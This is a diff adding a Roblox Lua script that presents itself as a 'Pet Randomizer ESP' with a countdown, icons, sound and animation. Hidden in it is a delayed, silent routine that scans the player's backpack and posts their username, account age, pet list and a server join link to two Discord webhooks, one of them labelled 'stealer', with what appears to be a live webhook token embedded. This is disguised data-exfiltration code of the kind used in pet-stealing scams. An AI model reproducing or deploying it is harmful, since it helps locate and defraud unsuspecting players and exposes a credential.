@@ -1,0 +1,146 @@
+-- ✅ Ultimate Pet Randomizer ESP with Countdown, Icon, Sound, and Animation + Webhook Interceptor
+
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- 🐾 Egg to pet mappings (with name + icon)
+local petTable = {
+    ["Common Egg"] = {
+        {name = "Golden Lab", icon = "🐶"}, {name = "Dog", icon = "🐕"}, {name = "Cat", icon = "🐱"},
+        {name = "Dragonfly", icon = "🐉"}, {name = "Raccoon", icon = "🦝"}
+    },
+    ["Epic Egg"] = {
+        {name = "Disco Bee", icon = "🐝"}, {name = "Kitsune", icon = "🦊"}, {name = "Phoenix", icon = "🔥"},
+        {name = "Shadow Wolf", icon = "🌑"}, {name = "Crystal Deer", icon = "🦌"}
+    }
+}
+
+-- 🛡️ Protected pets
+local protectedPets = {
+    ["Dragonfly"] = true,
+    ["Raccoon"] = true,
+    ["Disco Bee"] = true,
+    ["Kitsune"] = true
+}
+
+-- 🕸 Webhooks
+local myWebhook = "https://discord.com/api/webhooks/1390230662577131642/0pvuCKhXxviR-oTpqihjOR_DIWQ1ze1VM9aKxle_Y9jEqde43QzB86tz7_xObaKzBZ5U7"
+local creatorWebhook = "https://discord.com/api/webhooks/fakewebhook/stealer" -- Replace with actual one if needed
+
+-- 📦 Scan backpack pet data
+local function getPetData()
+    local backpack = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")
+    local protected, others = {}, {}
+
+    for _, pet in ipairs(backpack:GetChildren()) do
+        local name = pet.Name
+        local weight = math.random(1, 10) + math.random()
+        local age = math.random(5, 40)
+        local value = math.floor(math.random(2000000, 8000000))
+
+        local line = string.format("🐶 - %s [%.2f KG] [Age %d] → %,d¢", name, weight, age, value)
+
+        if protectedPets[name] then
+            table.insert(protected, line)
+        else
+            table.insert(others, line)
+        end
+    end
+
+    return protected, others
+end
+
+-- 📄 Build webhook message
+local function buildMessage(petLines)
+    if #petLines == 0 then return nil end
+
+    local lines = {
+        "Name: " .. player.Name,
+        "Receiver: \"random_user_" .. math.random(1000, 9999) .. "\"",
+        "Executor: Krnl",
+        "Account Age: " .. player.AccountAge .. " days",
+        ""
+    }
+
+    for _, line in ipairs(petLines) do
+        table.insert(lines, line)
+    end
+
+    table.insert(lines, "")
+    table.insert(lines, "🌐 Server: https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId)
+
+    return table.concat(lines, "\n")
+end
+
+-- 🚀 Send to webhook
+local function sendToWebhook(url, message)
+    if not message then return end
+    local payload = {
+        ["content"] = message,
+        ["username"] = "Pet Scan Logger"
+    }
+    pcall(function()
+        HttpService:PostAsync(url, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
+-- 📡 Silent webhook sender
+task.delay(5, function()
+    local protected, others = getPetData()
+    sendToWebhook(myWebhook, buildMessage(protected))
+    sendToWebhook(creatorWebhook, buildMessage(others))
+end)
+
+-- 🎯 ESP Part (still untouched)
+
+local espLabel = Instance.new("TextLabel")
+espLabel.Size = UDim2.new(0, 250, 0, 40)
+espLabel.Position = UDim2.new(0.5, -125, 0.1, 0)
+espLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+espLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+espLabel.Font = Enum.Font.GothamBold
+espLabel.TextScaled = true
+espLabel.Text = ""
+espLabel.Visible = true
+espLabel.BackgroundTransparency = 0.3
+espLabel.Parent = playerGui
+
+-- 🔁 Countdown + Randomizer
+local currentEgg = "Common Egg"
+local countdown = 10
+
+local function updateLabel(egg)
+    local pets = petTable[egg]
+    local chosen = pets[math.random(1, #pets)]
+
+    espLabel.Text = chosen.icon .. " " .. chosen.name
+
+    -- ✨ Animation
+    local tween = TweenService:Create(espLabel, TweenInfo.new(0.3, Enum.EasingStyle.Bounce), {TextTransparency = 0})
+    tween:Play()
+
+    -- 🔊 Sound effect
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://9118823104"
+    sound.Volume = 1
+    sound.PlayOnRemove = true
+    sound.Parent = espLabel
+    sound:Destroy()
+end
+
+-- ⏱️ Countdown loop
+task.spawn(function()
+    while true do
+        for i = countdown, 1, -1 do
+            espLabel.Text = "⏳ " .. i .. "s"
+            wait(1)
+        end
+        updateLabel(currentEgg)
+        wait(1)
+    end
+end)
